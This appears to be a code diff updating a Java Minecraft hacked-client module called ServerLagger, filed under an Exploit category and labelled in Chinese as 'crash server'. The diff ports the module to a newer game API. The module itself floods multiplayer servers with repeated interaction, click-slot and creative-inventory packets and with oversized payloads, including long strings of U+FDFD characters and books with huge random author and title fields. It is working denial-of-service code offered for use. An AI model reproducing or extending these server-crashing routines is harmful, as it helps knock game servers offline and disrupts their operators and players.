@@ -46,11 +46,10 @@ import java.util.stream.IntStream;
 
 public class ServerLagger extends Module {
     private final String message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd";
-    private final String color = "red";
-    private final Text line1 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
-    private final Text line2 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
-    private final Text line3 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
-    private final Text line4 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
+    private final Text line1 = Text.of(message);
+    private final Text line2 = Text.of(message);
+    private final Text line3 = Text.of(message);
+    private final Text line4 = Text.of(message);
     public ServerLagger() {
         super("ServerLagger", Category.Exploit);
         setChinese("崩服");
@@ -149,7 +148,7 @@ public class ServerLagger extends Module {
             }
             case SequenceItem -> {
                 for (int i = 0; i < sequencePackets.getValue(); i++) {
-                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1));
+                    sendSequencedPacket(id -> new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, id, mc.player.getYaw(), mc.player.getPitch()));
                 }
             }
             case SequenceBlock -> {
@@ -208,7 +207,7 @@ public class ServerLagger extends Module {
             }
             case InteractItem -> {
                 for (int i = 0; i < interactPackets.getValue(); i++) {
-                    sendSequencedPacket(id -> new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, id));
+                    sendSequencedPacket(id -> new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, id, mc.player.getYaw(), mc.player.getPitch()));
                 }
             }
             case InvalidClickSlot -> {
@@ -254,7 +253,6 @@ public class ServerLagger extends Module {
                 list.add(NbtDouble.of(pos.y));
                 list.add(NbtDouble.of(pos.z));
                 tag.put("Pos", list);
-                the.setSubNbt("BlockEntityTag", tag);
                 for (int i = 0; i < creativePackets.getValue(); i++) {
                     mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, the));
                 }
@@ -372,7 +370,6 @@ public class ServerLagger extends Module {
                     tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
                     tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
                     tag.put("pages", list);
-                    book.setNbt(tag);
                     mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(slot, book));
                 }
             }
